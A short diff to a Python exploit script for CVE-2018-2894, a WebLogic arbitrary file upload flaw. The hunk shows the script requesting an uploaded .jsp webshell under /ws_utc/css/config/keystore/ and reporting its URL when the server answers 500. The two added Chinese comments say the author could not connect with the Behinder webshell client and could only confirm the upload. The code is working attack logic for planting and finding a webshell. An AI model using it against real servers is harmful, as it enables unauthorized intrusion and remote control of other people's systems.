@@ -42,6 +42,8 @@ def upload(url):
         filename = timestamp.string + '_a.jsp'
         resp2 = requests.get(url=url+'/ws_utc/css/config/keystore/'+filename,headers=headers)
         if resp2.status_code == 500:
+            # 不知道为什么,使用冰蝎连接时一直连接不到,可能之前又可以...环境重启了几次也不行..有点疑惑,资料也都没又提及...
+            # 只能验证到文件上传那一步...
             print("可能存在CVE-2018-2894,尝试连接该webshell:"+url+'/ws_utc/css/config/keystore/'+filename)
             break
 
